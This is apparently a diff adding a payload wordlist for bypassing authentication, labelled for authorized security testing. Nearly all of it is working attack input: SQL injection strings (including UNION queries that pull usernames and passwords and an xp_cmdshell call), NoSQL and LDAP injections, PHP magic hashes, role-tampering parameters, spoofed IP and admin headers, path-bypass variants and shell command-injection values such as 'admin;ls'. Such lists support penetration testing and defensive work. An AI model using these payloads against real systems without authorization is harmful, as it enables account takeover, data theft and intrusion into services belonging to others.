@@ -1,0 +1,623 @@
+# Authentication Bypass Payloads
+# Comprehensive collection for authorized security testing
+# Use in login forms, API endpoints, auth headers
+
+# ============================================================================
+# SQL INJECTION IN AUTH
+# ============================================================================
+
+# Basic OR-based bypasses
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"/*
+" OR "1"="1"#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+or 1=1
+or 1=1--
+or 1=1#
+'or'1'='1
+'or'1'='1'--
+"or"1"="1
+"or"1"="1"--
+
+# Admin-specific bypasses
+admin'--
+admin'#
+admin'/*
+admin' --
+admin' #
+admin' /*
+admin" --
+admin" #
+admin" /*
+admin')--
+admin')#
+admin'/*
+administrator'--
+administrator'#
+root'--
+root'#
+
+# Commented bypasses
+'--
+'#
+'/*
+"--
+"#
+"/*
+')--
+')#
+')/*
+")--
+")#
+")/*
+
+# Parentheses manipulation
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'#
+") OR ("1"="1
+") OR ("1"="1"--
+)) OR (('1'='1
+))) OR ((('1'='1
+
+# UNION-based bypasses
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'admin','password'--
+' UNION SELECT username,password FROM users--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT NULL,NULL--
+
+# Time-based blind (for detection)
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+" OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(10000000,SHA1('test'))--
+') OR SLEEP(5)--
+
+# Boolean-based blind
+' OR '1'='1' AND '1'='1
+' OR '1'='1' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+
+# Database-specific payloads
+# PostgreSQL
+' OR 1=1 OFFSET 1--
+'; SELECT pg_sleep(5)--
+
+# Oracle
+' OR 1=1--
+' OR '1'='1'--
+'; SELECT * FROM dual--
+
+# Microsoft SQL
+' OR 1=1--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+' UNION SELECT @@version--
+
+# ============================================================================
+# NOSQL INJECTION
+# ============================================================================
+
+# MongoDB operators
+{"$gt": ""}
+{"$ne": ""}
+{"$ne": null}
+{"$gte": ""}
+{"$regex": ".*"}
+{"$regex": "^a"}
+{"$exists": true}
+{"$nin": []}
+{"$in": ["admin", "root"]}
+{"$where": "1==1"}
+{"$or": [{"username": "admin"}, {"username": "root"}]}
+
+# JSON injection patterns
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$in": ["admin"]}, "password": {"$gt": ""}}
+
+# URL-encoded NoSQL
+username[$ne]=&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$ne]=
+
+# JavaScript injection in MongoDB
+admin' && this.password.match(/.*/)//+%00
+admin' || '1'=='1
+admin'; return true; var dummy='
+admin'; return this.password.match(/.*/);//
+
+# ============================================================================
+# LDAP INJECTION
+# ============================================================================
+
+*
+*)(&
+*)(uid=*))(|(uid=*
+admin)(|(password=*))
+*)(objectClass=*
+*)(|(uid=*
+*))%00
+*()|(&
+admin)(&(password=*
+admin)(|(objectclass=*))
+admin)(|(password=*))
+*)(cn=*
+admin)(&(objectclass=person)(cn=*
+)(cn=))(|(cn=*
+admin)(!(&(1=0))
+
+# ============================================================================
+# TYPE JUGGLING (PHP)
+# ============================================================================
+
+# Magic hashes (MD5)
+0e215962017
+0e462097431906509019562988736854
+0e830400451993494058024219903391
+0e1137126905627722404141251025936
+
+# Boolean coercion
+0
+true
+false
+[]
+[""]
+[0]
+null
+""
+0e1
+1e0
+
+# Array bypass
+password[]=
+password[]=admin
+password[]=1
+
+# ============================================================================
+# NULL/EMPTY BYPASSES
+# ============================================================================
+
+null
+NULL
+Null
+None
+undefined
+nil
+NaN
+(null)
+(NULL)
+%00
+\x00
+\0
+''
+""
+``
+[]
+{}
+()
+,
+;
+
+# Empty with variations
+=
+%00
+%0a
+%0d
+%09
+%20
+%0b
+%0c
+
+# ============================================================================
+# PARAMETER MANIPULATION
+# ============================================================================
+
+# Role elevation
+admin=true
+admin=1
+isAdmin=true
+isAdmin=1
+is_admin=true
+is_admin=1
+role=admin
+role=administrator
+role=root
+role=superuser
+privilege=admin
+privilege=administrator
+privileged=true
+user_role=admin
+user_level=9999
+user_level=0
+access_level=admin
+permission=all
+permissions=admin
+group=admin
+groups=admin
+
+# Authentication bypass
+auth=1
+auth=true
+authenticated=true
+authenticated=1
+loggedin=true
+logged_in=1
+bypass=true
+skip_auth=1
+no_auth=1
+debug=1
+debug=true
+test=1
+admin_mode=1
+
+# Session manipulation
+session=admin
+session_id=1
+user_id=1
+uid=1
+id=1
+account_id=1
+
+# ============================================================================
+# RESPONSE MANIPULATION TARGETS
+# ============================================================================
+
+# Change these in intercepted responses:
+"authenticated": false -> "authenticated": true
+"success": false -> "success": true
+"error": true -> "error": false
+"valid": false -> "valid": true
+"authorized": false -> "authorized": true
+"role": "user" -> "role": "admin"
+"admin": false -> "admin": true
+"status": "fail" -> "status": "success"
+"code": 401 -> "code": 200
+"code": 403 -> "code": 200
+"message": "Access denied" -> "message": "Access granted"
+HTTP 401 -> HTTP 200
+HTTP 403 -> HTTP 200
+HTTP 302 (to login) -> HTTP 200
+
+# ============================================================================
+# HTTP VERB TAMPERING
+# ============================================================================
+
+# Try these methods on restricted endpoints:
+GET
+POST
+PUT
+PATCH
+DELETE
+HEAD
+OPTIONS
+TRACE
+CONNECT
+PROPFIND
+PROPPATCH
+MKCOL
+COPY
+MOVE
+LOCK
+UNLOCK
+VERSION-CONTROL
+REPORT
+CHECKOUT
+CHECKIN
+UNCHECKOUT
+MKWORKSPACE
+UPDATE
+LABEL
+MERGE
+BASELINE-CONTROL
+MKACTIVITY
+ORDERPATCH
+ACL
+SEARCH
+ARBITRARY
+
+# Case variations
+get
+Get
+gEt
+GeT
+post
+Post
+pOsT
+
+# ============================================================================
+# HEADER INJECTION
+# ============================================================================
+
+# IP spoofing headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: 172.16.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Host: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded-For: 127.0.0.1
+
+# URL rewrite headers
+X-Original-URL: /admin
+X-Original-URL: /admin/
+X-Original-URL: /api/admin
+X-Rewrite-URL: /admin
+X-Rewrite-URL: /admin/
+X-Custom-IP-Authorization: 127.0.0.1
+
+# Host header attacks
+Host: localhost
+Host: 127.0.0.1
+Host: admin.target.com
+Host: target.com/admin
+X-Forwarded-Host: localhost
+X-Forwarded-Host: admin.target.com
+
+# Authentication bypass headers
+X-Auth-Token: admin
+X-API-Key: admin
+X-Access-Token: admin
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Bearer admin
+X-Forwarded-User: admin
+X-Remote-User: admin
+REMOTE_USER: admin
+
+# Custom auth bypass
+X-Auth: admin
+X-Authenticated: true
+X-Authorized: true
+X-Admin: true
+X-Is-Admin: true
+X-User-Role: admin
+X-Bypass-Auth: true
+
+# ============================================================================
+# PATH BYPASS
+# ============================================================================
+
+# Case manipulation
+/admin -> /Admin
+/admin -> /ADMIN
+/admin -> /aDmIn
+
+# Trailing characters
+/admin -> /admin/
+/admin -> /admin//
+/admin -> /admin///
+/admin -> /admin.
+/admin -> /admin..
+/admin -> /admin./
+/admin -> /admin.//.
+
+# Path traversal
+/admin -> /./admin
+/admin -> /../admin
+/admin -> /./admin/./
+/admin -> /./admin/../admin
+/admin -> //admin
+/admin -> ///admin
+/admin -> /;/admin
+/admin -> /.;/admin
+/admin -> /..;/admin
+/admin -> /admin;/
+/admin -> /admin;.css
+/admin -> /admin;.js
+/admin -> /admin;.html
+
+# URL encoding
+/admin -> /%61dmin
+/admin -> /adm%69n
+/admin -> /%2fadmin
+/admin -> /admin%2f
+/admin -> /%2e/admin
+/admin -> /admin%00
+/admin -> /admin%00.html
+/admin -> /admin%20
+/admin -> /admin%09
+/admin -> /admin%0a
+/admin -> /admin%0d
+
+# Double URL encoding
+/admin -> /%252fadmin
+/admin -> /admin%252f
+/admin -> /%252e/admin
+
+# Unicode/UTF-8
+/admin -> /admin%c0%af
+/admin -> /admin%e0%80%af
+/admin -> /%c0%afadmin
+/admin -> /admi%c0%aen
+
+# Extension manipulation
+/admin -> /admin.json
+/admin -> /admin.xml
+/admin -> /admin.html
+/admin -> /admin.php
+/admin -> /admin.asp
+/admin -> /admin.aspx
+/admin -> /admin.do
+/admin -> /admin.action
+/admin -> /admin?
+
+# Query string injection
+/admin -> /admin?
+/admin -> /admin??
+/admin -> /admin?anything
+/admin -> /admin#
+/admin -> /admin#anything
+
+# Fragment injection
+/admin -> /public/../admin
+/admin -> /public/..%2fadmin
+/admin -> /api/../admin
+/admin -> /v1/../admin
+
+# Wildcard and special chars
+/admin -> /admin*
+/admin -> /*admin
+/admin -> /admin.*
+
+# ============================================================================
+# AUTHENTICATION PROTOCOL ATTACKS
+# ============================================================================
+
+# Basic Auth manipulation
+Authorization: Basic
+Authorization: Basic =
+Authorization: Basic YWRtaW46
+Authorization: Basic Og==
+Authorization: Basic YWRtaW46YWRtaW4=
+
+# Bearer token manipulation
+Authorization: Bearer
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Bearer admin
+Authorization: Bearer <script>
+
+# Digest Auth manipulation
+Authorization: Digest username=""
+
+# NTLM manipulation
+Authorization: NTLM
+
+# Negotiate
+Authorization: Negotiate
+
+# ============================================================================
+# SPECIAL CHARACTERS
+# ============================================================================
+
+# Null byte injection
+admin%00
+admin\x00
+admin\0
+password%00
+%00admin
+\x00password
+
+# Newline injection
+admin%0a
+admin%0d
+admin%0d%0a
+password%0a
+%0aadmin
+
+# Backslash variations
+admin\
+admin\\
+..\admin
+..\\admin
+
+# Special shell characters
+admin;ls
+admin|ls
+admin`ls`
+admin$(ls)
+admin&&ls
+admin||ls
+
+# ============================================================================
+# ENCODING VARIATIONS
+# ============================================================================
+
+# HTML entities
+&#97;dmin (admin)
+&lt;script&gt;
+&#x61;&#x64;&#x6d;&#x69;&#x6e;
+
+# Unicode normalization
+admin (with special unicode spaces)
+
+# Base64 encoded
+YWRtaW4= (admin)
+cGFzc3dvcmQ= (password)
+
+# Hex encoded
+0x61646d696e (admin)
+\x61\x64\x6d\x69\x6e (admin)
+
+# ============================================================================
+# FRAMEWORK-SPECIFIC BYPASSES
+# ============================================================================
+
+# Spring Security
+/admin -> /admin/
+/admin -> /Admin
+/admin -> /ADMIN
+
+# Django
+/admin -> /admin/
+/admin -> /admin//
+
+# Ruby on Rails
+/admin -> /admin.json
+/admin -> /admin.xml
+
+# Express.js / Node.js
+/admin -> /ADMIN
+/admin -> /admin%2e
+
+# PHP
+/admin -> /admin.php
+/admin -> /admin.PHP
+/admin -> /admin.pHp
+
+# ASP.NET
+/admin -> /admin.aspx
+/admin -> /admin.ASPX
+/admin -> /Admin.aspx
+
+# ============================================================================
+# RACE CONDITION PATTERNS
+# ============================================================================
+
+# Send these simultaneously:
+# 1. Login request
+# 2. Access protected resource
+# 3. Session creation request
+
+# Multi-request patterns:
+# - Multiple login attempts at exact same time
+# - Password reset + login simultaneously
+# - Registration + login simultaneously
